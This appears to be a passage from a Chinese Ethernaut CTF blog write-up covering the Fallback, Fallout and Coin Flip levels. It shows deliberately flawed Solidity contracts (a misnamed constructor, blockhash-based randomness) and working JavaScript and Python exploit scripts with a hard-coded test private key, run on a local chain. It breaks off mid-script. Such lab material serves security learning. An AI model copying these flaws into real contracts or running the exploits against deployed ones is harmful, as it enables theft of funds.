<p>接下来调<code>receive</code>，参考了一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyq55917/article/details/125471266"><code>receive</code>函数的用法</a>，对合约转账即可执行<code>receive</code>，比如用 <code>transfer()</code>、<code>send()</code> 或<code>call()</code>函数进行转账，这里我直接调用Ethernaut给我封装好的<code>contract.send</code>函数，输入要转的<code>Wei</code>数量即可</p>
<img src="/p/Ethernaut-note/image-20230919113403723.png" class="" title="img_image-20230919113403723">
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.send(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>然后再测一下所有权</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>已经变成我了，提款然后提交实例即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.withdraw()</span><br></pre></td></tr></table></figure>
<h1 id="02-Fallout">02_Fallout<a class="anchor" href="#02-Fallout">·</a></h1>
<p>获得以下合约的所有权来完成这一关.</p>
<p>这可能有帮助</p>
<ul>
<li>Solidity Remix IDE</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看看<code>owner</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0x0000000000000000000000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>好家伙，构造函数是假的（真的应该是叫<code>constructor()</code>），凋一下<code>Fal1out()</code>获得控制权</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.Fal1out()</span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后提交即可</p>
<h1 id="03-Coin-Flip">03_Coin Flip (*)<a class="anchor" href="#03-Coin-Flip">·</a></h1>
<p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p>
<p>这可能能帮助到你</p>
<ul>
<li>查看上面的帮助页面，<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“Beyond the console”</a> 部分</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上是猜<code>blockValue</code>比<code>FACTOR</code>大（<code>true</code>）还是小（<code>false</code>），<code>blockValue</code>是上一块的哈希，是公共信息，所以可以本地获取<code>blockValue</code>然后自己和<code>FACTOR</code>比较得出<code>side</code></p>
<p>这题我尝试用三种方法解，顺便学学环境</p>
<h2 id="JavaScript方法">JavaScript方法<a class="anchor" href="#JavaScript方法">·</a></h2>
<p>合约里的<code>block.number</code>可以<a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/28192/using-web3-to-pull-block-hash-and-timestamp">通过JS的<code>web3.eth.blockNumber</code>获取</a>，哈希可以通过<code>(await web3.eth.getBlock(blockNumber)).hash</code>计算，<code>FACTOR</code>是一常量，然后就可以算<code>side</code>了</p>
<p>首先把<code>FACTOR</code>定死</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br></pre></td></tr></table></figure>
<p>然后算<code>side</code>并抛币</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="keyword">await</span> web3.eth.getBlockNumber();</span><br><span class="line"><span class="keyword">var</span> blockValue = <span class="built_in">Number</span>((<span class="keyword">await</span> web3.eth.getBlock(num)).hash);</span><br><span class="line"><span class="keyword">var</span> side = blockValue &gt;= FACTOR;</span><br><span class="line"><span class="keyword">await</span> contract.flip(side)</span><br></pre></td></tr></table></figure>
<p>检查一下有没抛成功</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.consecutiveWins()).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>重复10次即可。</p>
<h3 id="绕过MetaMask调用">绕过MetaMask调用<a class="anchor" href="#绕过MetaMask调用">·</a></h3>
<p>但是，如果你是在公链上搞这题的话会有一个问题，就是在获取<code>num</code>后，计算<code>side</code>、提交到<code>flip</code>和在MetaMask上点击都需要时间，如果这段时间内公链上有其他人插入了新的区块，那么合约里的<code>block.number</code>就会大于<code>num</code>，从而退化为随机猜测，所以需要节约获取<code>num</code>到提交成功所消耗的时间</p>
<p>其中比较耗时的是MetaMask的弹出到点击，这里介绍另一种调用合约函数的方法</p>
<p>以上的合约调用都是使用Ethernaut封装好的<code>contract</code>，其实还有更通用的合约调用方法，</p>
<p>注：如果需要对合约进行写入，则需要提交手续费，而且需要使用账户的私钥对这笔交易进行签名，请注意不要轻易地暴露自己账户的私钥！（我是测试户所以没问题）</p>
<p>首先获取这个合约的实例，需要知道这个合约的<code>ABI</code>和合约地址，这里直接调用<code>contract</code>获取即可，然后把常量和私钥定一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> contract2 = <span class="keyword">new</span> web3.eth.Contract(contract.abi, contract.address);</span><br><span class="line"><span class="keyword">const</span> FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"><span class="keyword">const</span> sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>同样，计算<code>side</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="keyword">await</span> web3.eth.getBlockNumber();</span><br><span class="line"><span class="keyword">var</span> blockValue = <span class="built_in">Number</span>((<span class="keyword">await</span> web3.eth.getBlock(num)).hash);</span><br><span class="line"><span class="keyword">var</span> side = blockValue &gt;= FACTOR;</span><br></pre></td></tr></table></figure>
<p>然后调用<code>flip</code>函数，这里会有点麻烦，首先获取<code>flip(side)</code>的编码（注意这个编码是带输入的）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> functionEncode = <span class="keyword">await</span> contract2.methods.flip(side).encodeABI();</span><br></pre></td></tr></table></figure>
<p>然后需要自己填一些交易信息（之前是Ethernaut封装好的接口，所以可以省略这些信息，但这里要自己手动填）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tx = &#123;</span><br><span class="line">    <span class="attr">gas</span>: <span class="number">300000</span>,</span><br><span class="line">    <span class="attr">to</span>: contract.address,</span><br><span class="line">    <span class="attr">data</span>: functionEncode,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>因为<code>flip</code>会更改<code>consecutiveWins</code>，所以需要用私钥签名</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sign = <span class="keyword">await</span> web3.eth.accounts.signTransaction(tx, sk);</span><br></pre></td></tr></table></figure>
<p>最后发送这笔交易（不会弹出MetaMask，但还是要给钱的）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> web3.eth.sendSignedTransaction(sign.rawTransaction);</span><br></pre></td></tr></table></figure>
<p>把全部合起来，重复10次，就是</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="keyword">var</span> nonce = <span class="keyword">await</span> web3.eth.getTransactionCount(player, <span class="string">&#x27;pending&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> num = <span class="keyword">await</span> web3.eth.getBlockNumber();</span><br><span class="line">    <span class="keyword">var</span> blockValue = <span class="built_in">Number</span>((<span class="keyword">await</span> web3.eth.getBlock(num)).hash);</span><br><span class="line">    <span class="keyword">var</span> side = blockValue &gt;= FACTOR;</span><br><span class="line">    <span class="keyword">var</span> functionEncode = <span class="keyword">await</span> contract2.methods.flip(side).encodeABI();</span><br><span class="line">    <span class="keyword">const</span> tx = &#123;</span><br><span class="line">        <span class="attr">nonce</span>: nonce,</span><br><span class="line">        <span class="attr">gas</span>: <span class="number">300000</span>,</span><br><span class="line">        <span class="attr">to</span>: contract.address,</span><br><span class="line">        <span class="attr">data</span>: functionEncode,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> sign = <span class="keyword">await</span> web3.eth.accounts.signTransaction(tx, sk);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> web3.eth.sendSignedTransaction(sign.rawTransaction);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再看看<code>consecutiveWins</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.consecutiveWins()).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 11</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<p>PS：<code>.encodeABI()</code>的操作其实也可以用<a target="_blank" rel="noopener" href="https://docs.web3js.org/api/web3-eth-abi/function/encodeFunctionCall"><code>web3.eth.abi.encodeFunctionCall</code></a>，不过会比较麻烦，需要自己填<code>ABI</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> functionEncode = web3.eth.abi.encodeFunctionCall(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;flip&quot;</span>,</span><br><span class="line">    <span class="attr">inputs</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;bool&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;_guess&quot;</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  [side]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// &#x27;0x1d263f670000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>没输入的话可以直接<a target="_blank" rel="noopener" href="https://docs.web3js.org/api/web3-eth-abi/function/encodeFunctionSignature"><code>web3.eth.abi.encodeFunctionSignature</code></a>（不过这里显然有输入）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.abi.encodeFunctionSignature(<span class="string">&#x27;flip(bool)&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;0x1d263f67&#x27;</span></span><br></pre></td></tr></table></figure>
<p>还是原来的方便一点（</p>
<h2 id="Python方法">Python方法<a class="anchor" href="#Python方法">·</a></h2>
<p>思路类似，只是写的代码不太一样。</p>
<p>首先需要先连接上Provider，要知道RPC的URL，就是<code>http://localhost:8545</code></p>
<p>PS：关于RPC的信息，可以在MetaMask中：设置 -&gt; 网络 -&gt; 点击<code>Localhost 8545</code>查看，这里还可以获得链ID，后面会用到</p>
<img src="/p/Ethernaut-note/image-20230919131611602.png" class="" title="img_image-20230919131611602">
<p>连接Provider</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line">RPC_url = <span class="string">&#x27;http://localhost:8545&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(RPC_url))</span><br><span class="line">state = web3.is_connected()</span><br><span class="line"><span class="built_in">print</span>(state)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>
<p>连接账户（PS：记得不要轻易泄露自己的私钥，我这只是测试户），顺便看看余额，能打印出来就是成功连上了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">player = <span class="string">&#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br><span class="line">sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span></span><br><span class="line">account = web3.eth.account.from_key(sk)</span><br><span class="line"><span class="built_in">print</span>(web3.eth.get_balance(player))</span><br><span class="line"><span class="comment"># 9999933250761801410840</span></span><br></pre></td></tr></table></figure>
<p>连接合约，需要知道合约的<code>ABI</code>和合约地址，回到浏览器中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(contract.abi)</span><br><span class="line">contract.address</span><br></pre></td></tr></table></figure>
<p>记下结果，然后回到Python代码中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># JSON.stringify(contract.abi)</span></span><br><span class="line">abi_json = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;consecutiveWins&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;,&quot;constant&quot;:true,&quot;signature&quot;:&quot;0xe6f334d7&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;_guess&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;name&quot;:&quot;flip&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;,&quot;signature&quot;:&quot;0x1d263f67&quot;&#125;]&#x27;</span></span><br><span class="line">abi = json.loads(abi_json)</span><br><span class="line"><span class="comment"># contract.address</span></span><br><span class="line">address = <span class="string">&#x27;0x94099942864EA81cCF197E9D71ac53310b1468D8&#x27;</span></span><br><span class="line">contract2 = web3.eth.contract(abi=abi, address=address)</span><br></pre></td></tr></table></figure>
<p>合约中只读函数直接调用即可，无需签名，下面调一下<code>public</code>变量<code>consecutiveWins</code>看看是否连接上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(contract2.functions.consecutiveWins().call())</span><br><span class="line"><span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
<p><code>web3.py</code>中，获取<code>block.number</code>使用的是<code>web3.eth.block_number</code>，下面计算<code>side</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></span><br><span class="line">num = web3.eth.block_number</span><br><span class="line">blockValue = <span class="built_in">int</span>(web3.eth.get_block(num).<span class="built_in">hash</span>.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">side = blockValue &gt;= FACTOR</span><br></pre></td></tr></table></figure>
<p>类似地，调用<code>flip(side)</code>时先要获取其编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functionEncode = contract2.encodeABI(fn_name=<span class="string">&quot;flip&quot;</span>, args=[side])</span><br></pre></td></tr></table></figure>
<p>填写交易信息，<code>web3.py</code>需要的信息会复杂一点，还需要填<code>chainId</code>、<code>nonce</code>和<code>gasPrice</code></p>
<ul>
<li><code>chainId</code>上面已经获取了，填上<code>1337</code>即可</li>
<li><code>nonce</code>是一个递增的值，填<code>web3.eth.get_transaction_count(account.address)</code>即可，搞乱了后面修回来会很麻烦</li>
<li><code>gasPrice</code>是燃料费，私链的话随便填一下就好了，公链的话就要考虑很多东西，建议避开高峰期然后参考市场价填（北京时间的早上，美国那边的下班时间好像会便宜一点），填太低的话要等很久才能交易，填太高就费钱，可以<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/300211">参考一下计费规则</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chainId = <span class="built_in">int</span>(<span class="number">1337</span>)</span><br><span class="line">nonce = <span class="built_in">int</span>(web3.eth.get_transaction_count(account.address))</span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chainId,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="built_in">int</span>(<span class="number">50000</span>),</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(<span class="number">0</span>),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: player,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: address,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: functionEncode,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对交易签名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sign = web3.eth.account.sign_transaction(tx, sk)</span><br></pre></td></tr></table></figure>
<p>发送交易</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashTx = web3.eth.send_raw_transaction(sign.rawTransaction).<span class="built_in">hex</span>()</span><br><span class="line">result = web3.eth.wait_for_transaction_receipt(hashTx)</span><br></pre></td></tr></table></figure>
<p>连着做10次的话就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">chainId = <span class="built_in">int</span>(<span class="number">1337</span>)</span><br><span class="line">RPC_url = <span class="string">&#x27;http://localhost:8545&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(RPC_url))</span><br><span class="line"></span><br><span class="line">state = web3.is_connected()</span><br><span class="line"><span class="built_in">print</span>(state)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">player = <span class="string">&#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br><span class="line">sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span></span><br><span class="line">account = web3.eth.account.from_key(sk)</span><br><span class="line"><span class="built_in">print</span>(web3.eth.get_balance(player))</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSON.stringify(contract.abi)</span></span><br><span class="line">abi_json = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;consecutiveWins&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;,&quot;constant&quot;:true,&quot;signature&quot;:&quot;0xe6f334d7&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;_guess&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;name&quot;:&quot;flip&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;,&quot;signature&quot;:&quot;0x1d263f67&quot;&#125;]&#x27;</span></span><br><span class="line">abi = json.loads(abi_json)</span><br><span class="line"><span class="comment"># contract.address</span></span><br><span class="line">address = <span 